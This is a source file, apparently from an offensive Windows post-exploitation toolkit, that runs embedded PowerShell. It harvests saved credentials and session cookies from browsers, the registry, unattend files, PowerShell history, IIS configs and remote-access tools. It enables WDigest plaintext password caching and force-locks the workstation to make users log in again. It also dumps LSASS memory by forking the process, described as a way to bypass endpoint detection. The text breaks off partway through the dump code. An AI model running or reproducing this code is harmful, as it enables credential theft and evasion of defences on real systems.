                    $cmd.CommandText = "SELECT DISTINCT host_key FROM cookies WHERE host_key LIKE '%github%' OR host_key LIKE '%google%' OR host_key LIKE '%azure%' OR host_key LIKE '%aws%' OR host_key LIKE '%slack%' OR host_key LIKE '%office%' OR host_key LIKE '%microsoft%'"
                    $reader = $cmd.ExecuteReader()
                    $interesting = @()
                    while ($reader.Read()) { $interesting += $reader['host_key'] }
                    $conn.Close()

                    Write-Output "    [$profile] Total cookies: $total"
                    if ($interesting) {
                        Write-Output "    [!] High-value session cookies for:"
                        foreach ($h in $interesting) { Write-Output "        $h" }
                    }
                } catch {}
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
        }

        if ('${action}' -eq 'history' -or '${action}' -eq 'all') {
            $historyDb = Join-Path $profilePath "History"
            if (Test-Path $historyDb) {
                $tempDb = "$env:TEMP\\cs-history-$(Get-Random).db"
                Copy-Item $historyDb $tempDb -Force -ErrorAction SilentlyContinue
                try {
                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;Read Only=True;")
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT url, title, visit_count FROM urls WHERE url LIKE '%admin%' OR url LIKE '%login%' OR url LIKE '%vpn%' OR url LIKE '%portal%' OR url LIKE '%internal%' OR url LIKE '%intranet%' ORDER BY visit_count DESC LIMIT 20"
                    $reader = $cmd.ExecuteReader()
                    $intUrls = @()
                    while ($reader.Read()) { $intUrls += "$($reader['url']) (visits: $($reader['visit_count']))" }
                    $conn.Close()

                    if ($intUrls) {
                        Write-Output "    [$profile] Interesting URLs:"
                        foreach ($u in $intUrls) { Write-Output "        $u" }
                    }
                } catch {}
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
        }
    }
    Write-Output ""
}

if ($targetBrowser -eq 'all' -or $targetBrowser -eq 'firefox') {
    Write-Output "=== Firefox ==="
    $ffProfiles = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"
    if (Test-Path $ffProfiles) {
        $profiles = Get-ChildItem $ffProfiles -Directory -ErrorAction SilentlyContinue
        foreach ($p in $profiles) {
            Write-Output "[*] Profile: $($p.Name)"
            $loginsJson = Join-Path $p.FullName "logins.json"
            if (Test-Path $loginsJson) {
                $logins = Get-Content $loginsJson -Raw | ConvertFrom-Json
                Write-Output "    [*] Saved logins: $($logins.logins.Count)"
                foreach ($l in $logins.logins | Select-Object -First 10) {
                    Write-Output "    $($l.hostname) — User: $($l.encryptedUsername)"
                }
                Write-Output "    [*] Passwords encrypted with NSS — decrypt with: firefox_decrypt.py"
            }

            $cookieDb = Join-Path $p.FullName "cookies.sqlite"
            if (Test-Path $cookieDb) {
                Write-Output "    [*] Cookie database exists: $cookieDb"
            }
        }
    } else {
        Write-Output "[-] Firefox not found"
    }
}
`
  const r = await ps(script, timeout)
  output.push(r.stdout)
  if (r.stderr) output.push(`[!] ${r.stderr}`)
  findings.push({
    checkId: "WIN-BROWSER-001",
    provider: "windows",
    severity: r.stdout.includes("Pass:") ? "critical" : "medium",
    status: r.stdout.includes("Pass:") ? "VULNERABLE" : "ENUMERATED",
    resource: "browser://credentials",
    title: "Browser credential harvest — passwords, cookies, history from all browsers",
    details: r.stdout.substring(0, 500),
    remediation:
      "Use enterprise password managers instead of browser password storage. Deploy Chrome/Edge policies to disable password saving.",
  })

  return { output: output.join("\n"), findings }
}

export async function regSecrets(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "full"
  const findings: Finding[] = []
  const output: string[] = ["[*] Registry credential extraction...\n"]

  const script = `
$credFinds = @()

if ('${action}' -eq 'autologon' -or '${action}' -eq 'full') {
    Write-Output "=== AutoLogon Credentials ==="
    $winlogon = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
    $defaultUser = (Get-ItemProperty $winlogon -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
    $defaultPass = (Get-ItemProperty $winlogon -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
    $defaultDomain = (Get-ItemProperty $winlogon -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
    $autoAdmin = (Get-ItemProperty $winlogon -Name AutoAdminLogon -ErrorAction SilentlyContinue).AutoAdminLogon

    if ($defaultPass) {
        Write-Output "[!!!] AutoLogon ENABLED with cleartext password!"
        Write-Output "    Domain: $defaultDomain"
        Write-Output "    Username: $defaultUser"
        Write-Output "    Password: $defaultPass"
        Write-Output "    AutoAdminLogon: $autoAdmin"
        $credFinds += "AutoLogon:$defaultDomain\\$defaultUser"
    } elseif ($defaultUser) {
        Write-Output "[*] AutoLogon user set but no cleartext password (LSA secret)"
        Write-Output "    Username: $defaultUser"
    } else {
        Write-Output "[-] No AutoLogon configured"
    }
    Write-Output ""
}

if ('${action}' -eq 'vnc' -or '${action}' -eq 'full') {
    Write-Output "=== VNC Passwords ==="
    $vncPaths = @(
        "HKLM:\\SOFTWARE\\RealVNC\\vncserver",
        "HKLM:\\SOFTWARE\\RealVNC\\WinVNC4",
        "HKCU:\\SOFTWARE\\RealVNC\\vncserver",
        "HKLM:\\SOFTWARE\\TightVNC\\Server",
        "HKCU:\\SOFTWARE\\TightVNC\\Server",
        "HKLM:\\SOFTWARE\\ORL\\WinVNC3",
        "HKLM:\\SOFTWARE\\ORL\\WinVNC\\Default"
    )
    foreach ($path in $vncPaths) {
        if (Test-Path $path) {
            $pass = (Get-ItemProperty $path -Name Password -ErrorAction SilentlyContinue).Password
            if ($pass) {
                $hex = ($pass | ForEach-Object { $_.ToString("X2") }) -join ''
                Write-Output "[!!!] VNC password found at $path"
                Write-Output "    Encrypted: $hex"
                Write-Output "    Decrypt with: vncpwd.exe or MSF vnc_decrypt"
                $credFinds += "VNC:$path"
            }
        }
    }
    if (-not ($credFinds | Where-Object { $_ -match 'VNC' })) { Write-Output "[-] No VNC passwords found" }
    Write-Output ""
}

if ('${action}' -eq 'putty' -or '${action}' -eq 'full') {
    Write-Output "=== PuTTY Saved Sessions ==="
    $puttyPath = "HKCU:\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions"
    if (Test-Path $puttyPath) {
        $sessions = Get-ChildItem $puttyPath -ErrorAction SilentlyContinue
        foreach ($s in $sessions) {
            $props = Get-ItemProperty $s.PSPath -ErrorAction SilentlyContinue
            Write-Output "[+] Session: $($s.PSChildName)"
            Write-Output "    Host: $($props.HostName):$($props.PortNumber)"
            Write-Output "    Username: $($props.UserName)"
            Write-Output "    Protocol: $($props.Protocol)"
            if ($props.ProxyUsername) { Write-Output "    Proxy user: $($props.ProxyUsername)" }
            if ($props.ProxyPassword) {
                Write-Output "    [!!!] Proxy password: $($props.ProxyPassword)"
                $credFinds += "PuTTY-Proxy:$($s.PSChildName)"
            }
            if ($props.PublicKeyFile) { Write-Output "    Key file: $($props.PublicKeyFile)" }
        }
    } else {
        Write-Output "[-] No PuTTY sessions found"
    }

    $sshHostKeys = "HKCU:\\SOFTWARE\\SimonTatham\\PuTTY\\SshHostKeys"
    if (Test-Path $sshHostKeys) {
        $keys = Get-ItemProperty $sshHostKeys -ErrorAction SilentlyContinue
        $keyCount = ($keys.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' }).Count
        Write-Output "[*] SSH host keys cached: $keyCount (reveals previously accessed hosts)"
    }
    Write-Output ""
}

if ('${action}' -eq 'winscp' -or '${action}' -eq 'full') {
    Write-Output "=== WinSCP Saved Credentials ==="
    $winscpPath = "HKCU:\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions"
    if (Test-Path $winscpPath) {
        $sessions = Get-ChildItem $winscpPath -ErrorAction SilentlyContinue
        foreach ($s in $sessions) {
            $props = Get-ItemProperty $s.PSPath -ErrorAction SilentlyContinue
            if ($props.HostName) {
                Write-Output "[+] Session: $($s.PSChildName)"
                Write-Output "    Host: $($props.HostName):$($props.PortNumber)"
                Write-Output "    Username: $($props.UserName)"
                if ($props.Password) {
                    Write-Output "    [!!!] Encrypted password present"
                    Write-Output "    Decrypt with: winscppasswd or MSF winscp_creds"
                    $credFinds += "WinSCP:$($props.HostName)"
                }
            }
        }
    } else {
        Write-Output "[-] No WinSCP sessions found"
    }
    Write-Output ""
}

if ('${action}' -eq 'rdp' -or '${action}' -eq 'full') {
    Write-Output "=== RDP Connection History ==="
    $rdpPath = "HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client"
    $servers = "HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers"
    if (Test-Path $servers) {
        $hosts = Get-ChildItem $servers -ErrorAction SilentlyContinue
        foreach ($h in $hosts) {
            $props = Get-ItemProperty $h.PSPath -ErrorAction SilentlyContinue
            Write-Output "[+] $($h.PSChildName) — Username: $($props.UsernameHint)"
        }
    }
    $mru = Get-ItemProperty "$rdpPath\\Default" -Name "MRU*" -ErrorAction SilentlyContinue
    if ($mru) {
        Write-Output "[*] Recent RDP connections (MRU):"
        $mru.PSObject.Properties | Where-Object { $_.Name -match 'MRU' } | ForEach-Object {
            Write-Output "    $($_.Value)"
        }
    }
    if (-not (Test-Path $servers)) { Write-Output "[-] No RDP history found" }
    Write-Output ""
}

if ('${action}' -eq 'services' -or '${action}' -eq 'full') {
    Write-Output "=== Service Account Credentials ==="
    $services = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object {
        $_.StartName -and $_.StartName -notmatch 'LocalSystem|LocalService|NetworkService|NT AUTHORITY'
    }
    if ($services) {
        foreach ($svc in $services) {
            Write-Output "[+] $($svc.Name) — RunAs: $($svc.StartName)"
            Write-Output "    Binary: $($svc.PathName)"
        }
        Write-Output ""
        Write-Output "[*] Service accounts may have cached credentials in LSA secrets"
        Write-Output "[*] Extract with: winhook lsass_dump or mimikatz lsadump::secrets"
    } else {
        Write-Output "[-] No custom service accounts found"
    }
    Write-Output ""
}

if ('${action}' -eq 'apps' -or '${action}' -eq 'full') {
    Write-Output "=== Application Credentials ==="

    $teamviewer = "HKLM:\\SOFTWARE\\TeamViewer","HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer"
    foreach ($tv in $teamviewer) {
        if (Test-Path $tv) {
            $props = Get-ItemProperty $tv -ErrorAction SilentlyContinue
            Write-Output "[+] TeamViewer found"
            if ($props.ClientID) { Write-Output "    Client ID: $($props.ClientID)" }
            if ($props.SecurityPasswordAES) {
                Write-Output "    [!!!] AES-encrypted password present"
                $credFinds += "TeamViewer"
            }
        }
    }

    $filezilla = "$env:APPDATA\\FileZilla\\sitemanager.xml","$env:APPDATA\\FileZilla\\recentservers.xml"
    foreach ($fz in $filezilla) {
        if (Test-Path $fz) {
            $content = Get-Content $fz -Raw -ErrorAction SilentlyContinue
            if ($content -match '<Pass[^>]*>([^<]+)</Pass>') {
                Write-Output "[!!!] FileZilla saved credentials: $fz"
                $credFinds += "FileZilla:$fz"
            }
        }
    }

    $mRemoteNG = "$env:APPDATA\\mRemoteNG\\confCons.xml"
    if (Test-Path $mRemoteNG) {
        Write-Output "[!!!] mRemoteNG config found: $mRemoteNG"
        Write-Output "    Decrypt with: mremoteng_decrypt or MSF mremoteng_creds"
        $credFinds += "mRemoteNG"
    }

    $mobilePasses = @(
        "$env:LOCALAPPDATA\\Microsoft\\Credentials",
        "$env:APPDATA\\Microsoft\\Credentials"
    )
    foreach ($mp in $mobilePasses) {
        if (Test-Path $mp) {
            $creds = Get-ChildItem $mp -ErrorAction SilentlyContinue
            if ($creds) {
                Write-Output "[*] Windows Credential files ($($creds.Count)): $mp"
                Write-Output "    Decrypt with: winhook dpapi_extract"
            }
        }
    }
    Write-Output ""
}

Write-Output "=== Credential Summary ==="
Write-Output "[*] Total credential findings: $($credFinds.Count)"
foreach ($cf in $credFinds) { Write-Output "    [!] $cf" }
`

  const r = await ps(script, timeout)
  output.push(r.stdout)
  if (r.stderr) output.push(`[!] ${r.stderr}`)
  findings.push({
    checkId: "WIN-REGSEC-001",
    provider: "windows",
    severity: r.stdout.includes("!!!") ? "critical" : "medium",
    status: r.stdout.includes("!!!") ? "VULNERABLE" : "CHECKED",
    resource: "registry://credentials",
    title: "Registry credential sweep — AutoLogon, VNC, PuTTY, WinSCP, services, apps",
    details: r.stdout.substring(0, 500),
    remediation:
      "Remove cleartext passwords from registry. Disable AutoLogon. Use credential managers with encryption.",
  })

  return { output: output.join("\n"), findings }
}

export async function storedCredsAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const deep = argVal(args, "--deep") === "true"
  const findings: Finding[] = []
  const output: string[] = ["[*] Stored credentials enumeration...\n"]

  const script = `
$found = 0

# ── 1. cmdkey stored credentials ──
Write-Output "=== Stored Credentials (cmdkey) ==="
$cmdkeyOutput = cmdkey /list 2>&1
if ($cmdkeyOutput -match 'Target:') {
    Write-Output $cmdkeyOutput
    $targets = ($cmdkeyOutput | Select-String 'Target:').Count
    $found += $targets
    Write-Output "[+] Found $targets stored credential(s)"
} else {
    Write-Output "[-] No stored credentials"
}

# ── 2. AutoLogon credentials ──
Write-Output ""
Write-Output "=== AutoLogon Credentials ==="
$winlogon = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
$autoUser = (Get-ItemProperty $winlogon -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
$autoPass = (Get-ItemProperty $winlogon -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
$autoDomain = (Get-ItemProperty $winlogon -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
$autoLogon = (Get-ItemProperty $winlogon -Name AutoAdminLogon -ErrorAction SilentlyContinue).AutoAdminLogon

if ($autoPass) {
    Write-Output "[+] AutoLogon ENABLED with password!"
    Write-Output "    Domain:   $autoDomain"
    Write-Output "    User:     $autoUser"
    Write-Output "    Password: $autoPass"
    Write-Output "    AutoAdmin: $autoLogon"
    $found++
} elseif ($autoUser) {
    Write-Output "[*] AutoLogon user set but no password in registry: $autoDomain\\$autoUser"
} else {
    Write-Output "[-] No AutoLogon configured"
}

# Also check LSA secrets for AutoLogon
$lsaAutoLogon = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -Name AutoLogonSID -ErrorAction SilentlyContinue).AutoLogonSID
if ($lsaAutoLogon) { Write-Output "[*] AutoLogonSID present (password may be in LSA secrets)" }

# ── 3. Unattend/Sysprep files ──
Write-Output ""
Write-Output "=== Unattend/Sysprep Files ==="
$unattendPaths = @(
    "$env:SystemRoot\\Panther\\Unattend.xml",
    "$env:SystemRoot\\Panther\\unattend.xml",
    "$env:SystemRoot\\Panther\\Unattended.xml",
    "$env:SystemRoot\\System32\\Sysprep\\unattend.xml",
    "$env:SystemRoot\\System32\\Sysprep\\Panther\\unattend.xml",
    "$env:SystemRoot\\sysprep\\sysprep.xml",
    "$env:SystemRoot\\sysprep.inf",
    "$env:SystemDrive\\unattend.xml"
)

foreach ($path in $unattendPaths) {
    if (Test-Path $path -ErrorAction SilentlyContinue) {
        Write-Output "[+] Found: $path"
        $content = Get-Content $path -Raw -ErrorAction SilentlyContinue
        # Look for password elements
        if ($content -match '<Password>[\s\S]*?<Value>([^<]+)</Value>') {
            $passValue = $Matches[1]
            # Try base64 decode
            try {
                $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($passValue))
                Write-Output "    [!] Password (decoded): $decoded"
            } catch {
                Write-Output "    [!] Password (raw): $passValue"
            }
            $found++
        }
        if ($content -match '<AutoLogon>') { Write-Output "    [*] Contains AutoLogon configuration" }
        if ($content -match '<AdministratorPassword>') { Write-Output "    [!] Contains AdministratorPassword" }
    }
}

# ── 4. PowerShell history ──
Write-Output ""
Write-Output "=== PowerShell History ==="
$historyPath = "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
if (Test-Path $historyPath) {
    $histContent = Get-Content $historyPath -ErrorAction SilentlyContinue
    $sensitive = $histContent | Select-String -Pattern 'password|passwd|pwd|secret|token|apikey|credential|key|connectionstring' -AllMatches
    if ($sensitive) {
        Write-Output "[+] Sensitive entries in PS history ($($sensitive.Count) matches):"
        $sensitive | Select-Object -First 20 | ForEach-Object { Write-Output "    $_" }
        $found += $sensitive.Count
    } else {
        Write-Output "[-] No sensitive keywords in history"
    }
    Write-Output "    History file: $historyPath ($($histContent.Count) lines)"
} else {
    Write-Output "[-] No PowerShell history file"
}

# Also check other users' history if admin
$otherHistories = Get-ChildItem "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
foreach ($h in $otherHistories) {
    if ($h.FullName -ne $historyPath) {
        Write-Output "    [*] Other user history: $($h.FullName) ($($h.Length) bytes)"
    }
}

# ── 5. IIS Application Pool Credentials ──
Write-Output ""
Write-Output "=== IIS Application Pool Credentials ==="
if (Get-Command appcmd -ErrorAction SilentlyContinue) {
    $pools = appcmd list apppool /text:name 2>$null
    foreach ($pool in $pools) {
        $config = appcmd list apppool "$pool" /text:processModel.userName 2>$null
        if ($config -and $config -ne '') {
            $pass = appcmd list apppool "$pool" /text:processModel.password 2>$null
            Write-Output "    [+] Pool: $pool — User: $config Password: $pass"
            $found++
        }
    }
} else {
    # Try via registry/config files
    $iisConfig = "$env:SystemRoot\\System32\\inetsrv\\config\\applicationHost.config"
    if (Test-Path $iisConfig) {
        $iisContent = Get-Content $iisConfig -Raw -ErrorAction SilentlyContinue
        if ($iisContent -match 'password="([^"]+)"') {
            Write-Output "    [+] Found password in applicationHost.config"
            $found++
        }
    } else {
        Write-Output "[-] IIS not installed"
    }
}

# ── 6. Web.config and connection strings ──
Write-Output ""
Write-Output "=== Web.config / Connection Strings ==="
$webConfigs = Get-ChildItem -Path "$env:SystemDrive\\inetpub", "$env:SystemDrive\\Sites", "$env:SystemDrive\\wwwroot" -Recurse -Filter "web.config" -ErrorAction SilentlyContinue | Select-Object -First 20
foreach ($wc in $webConfigs) {
    $wcContent = Get-Content $wc.FullName -Raw -ErrorAction SilentlyContinue
    if ($wcContent -match 'connectionString.*(?:password|pwd)=([^;"]+)') {
        Write-Output "    [+] $($wc.FullName): password in connection string"
        $found++
    }
}
if ($webConfigs.Count -eq 0) { Write-Output "[-] No web.config files found" }

# ── 7. Scheduled tasks with stored credentials ──
Write-Output ""
Write-Output "=== Scheduled Tasks with Stored Credentials ==="
$tasks = schtasks /query /fo csv /v 2>$null | ConvertFrom-Csv -ErrorAction SilentlyContinue
$credTasks = $tasks | Where-Object { $_.'Run As User' -and $_.'Run As User' -notmatch 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE|N/A|Disabled' } | Select-Object -First 15
if ($credTasks) {
    foreach ($t in $credTasks) {
        Write-Output "    [*] $($_.'TaskName') — RunAs: $($_.'Run As User')"
    }
} else {
    Write-Output "[-] No tasks with stored user credentials"
}

# ── 8. McAfee SiteList.xml ──
Write-Output ""
Write-Output "=== McAfee/Trellix SiteList.xml ==="
$siteListPaths = @(
    "$env:ALLUSERSPROFILE\\Application Data\\McAfee\\Common Framework\\SiteList.xml",
    "$env:ALLUSERSPROFILE\\McAfee\\Agent\\DB\\SiteList.xml",
    "C:\\Program Files\\McAfee\\Agent\\DB\\SiteList.xml",
    "C:\\Program Files (x86)\\McAfee\\Common Framework\\SiteList.xml"
)
foreach ($sl in $siteListPaths) {
    if (Test-Path $sl) {
        Write-Output "    [+] Found: $sl"
        $slContent = Get-Content $sl -Raw -ErrorAction SilentlyContinue
        if ($slContent -match 'Password="([^"]+)"') {
            Write-Output "    [!] Encrypted password found (use mcafee-sitelist-pwd-decryption to decrypt)"
            $found++
        }
    }
}

Write-Output ""
Write-Output "=== Summary ==="
Write-Output "[+] Total credential findings: $found"
`
  const result = await ps(script, timeout)
  output.push(result.stdout)

  const totalMatch = result.stdout.match(/Total credential findings: (\d+)/)
  const total = totalMatch ? parseInt(totalMatch[1]) : 0

  if (total > 0) {
    findings.push({
      checkId: "WIN-PRIVESC-CRED-001",
      provider: "windows",
      severity: "high",
      status: "ENUMERATED",
      resource: "credentials://stored",
      title: `${total} stored credential(s) found across system`,
      details: result.stdout.substring(0, 500),
      remediation:
        "Remove stored credentials with cmdkey /delete. Disable AutoLogon. Delete unattend files. Clear PowerShell history. Rotate exposed passwords.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function wdigestEnable(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const waitLogon = hasFlag(args, "--wait-logon")
  const findings: Finding[] = []
  const output: string[] = ["[*] WDigest credential caching control...\n"]

  if (action === "check") {
    const script = `
$regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'
Write-Output "=== WDigest Configuration ==="
try {
  $val = Get-ItemProperty -Path $regPath -Name UseLogonCredential -ErrorAction Stop
  Write-Output "UseLogonCredential: $($val.UseLogonCredential)"
  if ($val.UseLogonCredential -eq 1) {
    Write-Output "STATUS: ENABLED — plaintext credentials WILL be cached in LSASS on next logon"
  } else {
    Write-Output "STATUS: DISABLED — plaintext credentials NOT cached"
  }
} catch {
  Write-Output "UseLogonCredential: NOT SET (default = disabled on Win 8.1+/2012R2+)"
  Write-Output "STATUS: DISABLED — plaintext credentials NOT cached"
}
$os = Get-CimInstance Win32_OperatingSystem
Write-Output "OS: $($os.Caption) Build $($os.BuildNumber)"
if ([int]$os.BuildNumber -lt 9600) {
  Write-Output "NOTE: WDigest caching is ENABLED by default on this OS version (pre-8.1/2012R2)"
}
# Check if Credential Guard is active
$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard -ErrorAction SilentlyContinue
if ($dg -and $dg.SecurityServicesRunning -contains 1) {
  Write-Output "WARNING: Credential Guard is ACTIVE — WDigest caching may not expose credentials"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("ENABLED")) {
      findings.push({
        checkId: "WDIGEST-001",
        provider: "winhook",
        severity: "high",
        status: "FAIL",
        resource: "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
        title: "WDigest plaintext credential caching is enabled",
        details: "UseLogonCredential=1 — LSASS will cache plaintext passwords on next interactive logon",
        remediation: "Set UseLogonCredential to 0 or remove the registry value.",
      })
    }
  }

  if (action === "enable") {
    const script = `
$regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'
if (-not (Test-Path $regPath)) {
  New-Item -Path $regPath -Force | Out-Null
}
Set-ItemProperty -Path $regPath -Name UseLogonCredential -Value 1 -Type DWord -Force
$verify = (Get-ItemProperty -Path $regPath -Name UseLogonCredential).UseLogonCredential
if ($verify -eq 1) {
  Write-Output "SUCCESS: WDigest UseLogonCredential set to 1"
  Write-Output "Plaintext credentials will be cached in LSASS on NEXT interactive logon"
  Write-Output ""
  Write-Output "Next steps:"
  Write-Output "  1. Wait for user to log in interactively (or use --action lock to force)"
  Write-Output "  2. Run: winhook lsass_dump"
  Write-Output "  3. Plaintext passwords will appear in dump"
  Write-Output "  4. Run: winhook wdigest_enable --action disable (cleanup)"
} else {
  Write-Output "FAILED: Could not set UseLogonCredential — check permissions"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    findings.push({
      checkId: "WDIGEST-002",
      provider: "winhook",
      severity: "critical",
      status: r.stdout.includes("SUCCESS") ? "PASS" : "FAIL",
      resource: "WDigest",
      title: "WDigest plaintext caching enabled",
      details: r.stdout.substring(0, 500),
      remediation: "Run winhook wdigest_enable --action disable after credential harvesting.",
    })
  }

  if (action === "disable") {
    const script = `
$regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'
Set-ItemProperty -Path $regPath -Name UseLogonCredential -Value 0 -Type DWord -Force
$verify = (Get-ItemProperty -Path $regPath -Name UseLogonCredential).UseLogonCredential
if ($verify -eq 0) {
  Write-Output "SUCCESS: WDigest UseLogonCredential set to 0 — plaintext caching disabled"
} else {
  Write-Output "FAILED: Could not disable UseLogonCredential"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "lock") {
    const script = `
Write-Output "=== Forcing workstation lock to trigger re-authentication ==="
$signature = @'
[DllImport("user32.dll")]
public static extern bool LockWorkStation();
'@
$type = Add-Type -MemberDefinition $signature -Name WinAPI -Namespace LockScreen -PassThru
$result = $type::LockWorkStation()
if ($result) {
  Write-Output "SUCCESS: Workstation locked — user must re-authenticate"
  Write-Output "WDigest will cache plaintext credentials upon next interactive logon"
  Write-Output "After user logs back in, run: winhook lsass_dump"
} else {
  Write-Output "FAILED: Could not lock workstation (may need interactive session)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (waitLogon) {
    output.push("\n[*] Monitoring for new interactive logons...")
    const script = `
$startTime = Get-Date
Write-Output "Watching for logon events since $startTime..."
$timeout = 300
$elapsed = 0
while ($elapsed -lt $timeout) {
  $events = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624;StartTime=$startTime} -ErrorAction SilentlyContinue |
    Where-Object { $_.Properties[8].Value -in @(2, 10, 11) }
  if ($events) {
    foreach ($e in $events) {
      Write-Output "LOGON DETECTED: $($e.Properties[5].Value)\\$($e.Properties[6].Value) at $($e.TimeCreated)"
    }
    Write-Output "Credentials should now be cached in LSASS — run: winhook lsass_dump"
    break
  }
  Start-Sleep -Seconds 5
  $elapsed = (New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds
}
if ($elapsed -ge $timeout) {
  Write-Output "TIMEOUT: No interactive logon detected within $timeout seconds"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function nanodumpAdvanced(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "snapshot"
  const outfile = argVal(args, "--outfile") || `C:\\Windows\\Temp\\cs-nano-${Date.now()}.dmp`
  const findings: Finding[] = []
  const output: string[] = [`[*] Advanced LSASS Dump — EDR Bypass via ${method}\n`]

  const methods: Record<string, string> = {
    fork: `
# Fork & Dump: Clone LSASS via NtCreateProcessEx, dump the clone
Write-Output "[*] Method: Fork & Dump (NtCreateProcessEx)"
Write-Output "[*] Creates a child process of LSASS, dumps the child — bypasses LSASS handle monitoring"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class ForkDump {
    [DllImport("ntdll.dll")]
    public static extern int NtCreateProcessEx(
        out IntPtr ProcessHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ParentProcess,
        uint Flags,
        IntPtr SectionHandle,
        IntPtr DebugPort,
        IntPtr ExceptionPort,
        uint InJob
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("dbghelp.dll")]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess, uint processId, IntPtr hFile,
        uint dumpType, IntPtr exceptionParam,
        IntPtr userStreamParam, IntPtr callbackParam
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateFileW(
        [MarshalAs(UnmanagedType.LPWStr)] string filename,
        uint access, uint share, IntPtr security,
        uint creation, uint flags, IntPtr template
    );
}
"@

$lsassPid = (Get-Process lsass).Id
Write-Output "[+] LSASS PID: $lsassPid"

# Open LSASS with PROCESS_CREATE_PROCESS (0x80)
$hLsass = [ForkDump]::OpenProcess(0x80, $false, $lsassPid)
if ($hLsass -eq [IntPtr]::Zero) {
    Write-Output "[!] Cannot open LSASS — try running as SYSTEM"
    exit 1
}
Write-Output "[+] LSASS handle: $hLsass"

# Fork LSASS
$hClone = [IntPtr]::Zero
$status = [ForkDump]::NtCreateProcessEx([ref]$hClone, 0x1FFFFF, [IntPtr]::Zero, $hLsass, 4, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, 0)

if ($status -ne 0 -or $hClone -eq [IntPtr]::Zero) {
    Write-Output "[!] NtCreateProcessEx failed: 0x$($status.ToString('X8'))"
    [ForkDump]::CloseHandle($hLsass) | Out-Null
    exit 1
}
Write-Output "[+] LSASS clone created: handle $hClone"

# Dump the clone (not the original LSASS — EDR hooks on original won't fire)
$hFile = [ForkDump]::CreateFileW("${outfile.replace(/\\/g, "\\\\")}", 0x40000000, 0, [IntPtr]::Zero, 2, 0x80, [IntPtr]::Zero)
if ($hFile -eq [IntPtr]::new(-1)) {
    Write-Output "[!] Cannot create dump file"
    [ForkDump]::CloseHandle($hClone) | Out-Null
    [ForkDump]::CloseHandle($hLsass) | Out-Null
    exit 1
}

$dumpResult = [ForkDump]::MiniDumpWriteDump($hClone, 0, $hFile, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
[ForkDump]::CloseHandle($hFile) | Out-Null
[ForkDump]::CloseHandle($hClone) | Out-Null
[ForkDump]::CloseHandle($hLsass) | Out-Null

if ($dumpResult) {
    $size = (Get-Item "${outfile.replace(/\\/g, "\\\\")}").Length
    Write-Output "[+] LSASS clone dumped successfully!"
    Write-Output "    File: ${outfile}"
    Write-Output "    Size: $size bytes"
} else {
    Write-Output "[!] MiniDumpWriteDump failed on clone"
}
`,
    snapshot: `
# Snapshot: PssCreateSnapshot API — takes a process snapshot without opening LSASS handles
Write-Output "[*] Method: Process Snapshot (PssCaptureSnapshot)"
Write-Output "[*] Creates a snapshot of LSASS, dumps the snapshot — minimal handle interaction"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class SnapshotDump {
    [DllImport("kernel32.dll")]
